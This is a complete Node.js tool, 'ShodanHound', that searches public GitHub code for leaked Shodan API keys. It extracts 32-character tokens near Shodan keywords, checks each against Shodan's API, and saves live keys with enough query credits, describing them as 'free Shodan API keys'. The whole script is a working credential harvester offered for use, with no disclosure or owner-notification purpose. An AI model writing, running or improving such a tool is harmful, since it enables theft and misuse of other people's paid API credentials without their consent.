#!/usr/bin/env node
// ShodanHound 🐕 — hunt leaked Shodan API keys across public GitHub.
// Searches public repos via GitHub Code Search, then validates each
// candidate against the Shodan API so you only keep keys that are live.
//
// Usage: node shodanhound.mjs <github-token> <keys.out>
// Deps:  none (Node 18+ built-in fetch)

import { readFile, appendFile, writeFile } from 'node:fs/promises';
import { setTimeout as sleep } from 'node:timers/promises';

const GH_API = 'https://api.github.com';
const SHODAN_API = 'https://api.shodan.io';
const MIN_CREDITS = 50;          // only save keys with at least this many query credits
const KEYWORD_FILES = ['keywords/shodan.txt'];

// Scope each search to the file types where Shodan keys actually leak. Far fewer
// results than an unscoped sweep → way fewer file downloads → much faster.
const SCOPES = [
  'language:python',
  'language:javascript',
  'language:typescript',
  'language:json',
  'filename:.env',
];

const seen = new Set();          // dedupe keys within a run

const now = () => new Date().toLocaleString('uk-UA');

async function ghFetch(url, token) {
  // Retries on rate-limit / secondary-limit with Retry-After or exponential backoff.
  for (let attempt = 0; ; attempt++) {
    const res = await fetch(url, {
      headers: {
        Authorization: `Bearer ${token}`,
        Accept: 'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28',
        'User-Agent': 'ShodanHound',
      },
    });

    if (res.status === 403 || res.status === 429) {
      const retryAfter = Number(res.headers.get('retry-after'));
      const reset = Number(res.headers.get('x-ratelimit-reset'));
      let waitMs = 30_000;
      if (retryAfter) waitMs = retryAfter * 1000;
      else if (reset) waitMs = Math.max(1000, reset * 1000 - Date.now());
      else waitMs = Math.min(60_000, 2 ** attempt * 1000);
      console.log(`  rate limited — waiting ${Math.round(waitMs / 1000)}s`);
      await sleep(waitMs);
      continue;
    }

    return res;
  }
}

async function checkShodanKey(key, outFile) {
  if (seen.has(key)) return;
  seen.add(key);
  try {
    const res = await fetch(`${SHODAN_API}/api-info?key=${encodeURIComponent(key)}`);
    if (!res.ok) return;                       // 401 = invalid key, etc.
    const info = await res.json();
    if ((info.query_credits ?? 0) >= MIN_CREDITS) {
      console.log(`  ✓ KEY FOUND: ${key} (credits: ${info.query_credits}, scans: ${info.scan_credits})`);
      await appendFile(
        outFile,
        `${key} Credits: ${info.query_credits} Scans: ${info.scan_credits}\n`,
      );
    }
  } catch {
    /* network hiccup — skip this candidate */
  }
}

// A Shodan key is an isolated 32-char alphanumeric token. The negative
// look-arounds reject substrings of longer hashes/ids.
const TOKEN_RE = /(?<![A-Za-z0-9])[A-Za-z0-9]{32}(?![A-Za-z0-9])/g;

function extractCandidates(content, keyword) {
  // Format-agnostic: on any line mentioning the keyword (quotes, `=`, spaces and
  // case ignored), grab every bounded 32-char token — quoted or not. Works for
  // .py, .env, .php, .js, yaml, configs… The Shodan API validates the rest.
  const out = [];
  for (const original of content.split('\n')) {
    const norm = original.toLowerCase().replace(/\s/g, '');
    if (!norm.includes(keyword)) continue;
    for (const token of original.match(TOKEN_RE) ?? []) out.push(token);
  }
  return out;
}

async function searchKeyword(token, outFile, keyword, scope) {
  const q = `${scope} ${keyword}`;
  console.log(`${now()} — query: '${q}'`);

  // Code search is paginated; 100/page, hard cap of 1000 results.
  for (let page = 1; page <= 10; page++) {
    const url = `${GH_API}/search/code?q=${encodeURIComponent(q)}&per_page=100&page=${page}`;
    const res = await ghFetch(url, token);
    if (!res.ok) {
      console.log(`  search failed (${res.status}) — skipping rest of this query`);
      return;
    }
    const data = await res.json();
    const items = data.items ?? [];
    if (items.length === 0) break;

    for (const item of items) {
      try {
        const cres = await ghFetch(item.url, token);     // contents API → base64
        if (!cres.ok) continue;
        const cjson = await cres.json();
        if (cjson.encoding !== 'base64' || !cjson.content) continue;
        const content = Buffer.from(cjson.content, 'base64').toString('utf-8');
        for (const key of extractCandidates(content, keyword)) {
          await checkShodanKey(key, outFile);
        }
      } catch {
        /* unreadable file — skip */
      }
    }

    if (items.length < 100) break;             // last page
  }
}

async function main() {
  const [, , token, outFile] = process.argv;
  if (!token || !outFile) {
    console.log('Usage: node shodanhound.mjs <github-token> <keys.out>');
    process.exit(1);
  }

  console.log('Searching for free Shodan API keys in public GitHub repos.');
  console.log('This may take a while due to GitHub search rate limits.\n');

  await writeFile(outFile, '', { flag: 'a' });  // ensure file exists

  for (const file of KEYWORD_FILES) {
    const keywords = (await readFile(file, 'utf-8'))
      .split('\n')
      .map((l) => l.trim())
      .filter(Boolean);

    for (const keyword of keywords) {
      for (const scope of SCOPES) {
        await searchKeyword(token, outFile, keyword, scope);
      }
    }
  }

  console.log(`\nDone. ${seen.size} unique candidates checked. Results in ${outFile}`);
}

main().catch((e) => {
  console.error('Fatal:', e.message);
  process.exit(1);
});
